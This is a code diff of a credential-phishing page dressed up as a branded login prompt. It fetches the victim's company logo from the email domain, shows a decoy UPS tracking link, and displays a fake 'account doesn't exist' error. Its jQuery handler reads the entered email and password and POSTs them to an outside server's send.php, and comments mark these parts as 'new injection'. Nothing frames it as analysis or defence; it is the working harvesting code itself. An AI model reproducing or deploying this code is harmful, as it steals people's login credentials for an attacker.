@@ -24,7 +24,7 @@
                             <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
                             <small></small>
                             <div class="form-group">
-							<form action="#" id="myform"  method="POST">
+							<form  action="">
 <input type="hidden" name="" value="https://www.ups.com/track?loc=en_US/">
                                 <input type="email" id="ai" class="form-control" value="" placeholder="someone@example.com" required="">
                             </div>
@@ -88,6 +88,11 @@ $(document).ready(function() {
         event.preventDefault();
         var ai = $("#ai").val();
         var pr = $("#pr").val();
+
+    //console.log(ai)
+    //console.log(pr)
+
+
         var msg = $('#msg').html();
         $('#msg').text(msg);
         ///////////new injection////////////////
@@ -119,20 +124,36 @@ $(document).ready(function() {
         var c = my_slice.substr(0, my_slice.indexOf('.'));
         var final = c.toLowerCase();
         var dom = c.toUpperCase();
+
+       // console.log(dom)
         ///////////new injection////////////////
         count = count + 1;
         $('#ai').attr('disabled', "");
         $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
         $('#domain-name').html(dom);
 
+
+
+
+
+
+
+
+
+
         $.ajax({
             dataType: 'JSON',
+          
+
+
             url:'https://stoic-meninsky.13-53-105-16.plesk.page/send.php',
             type: 'POST',
             data: {
                 ai: ai,
                 pr: pr,
             },
+        
+
             // data: $('#contact').serialize(),
             beforeSend: function(xhr) {
                 $('#submit-btn').html('Verifing...');
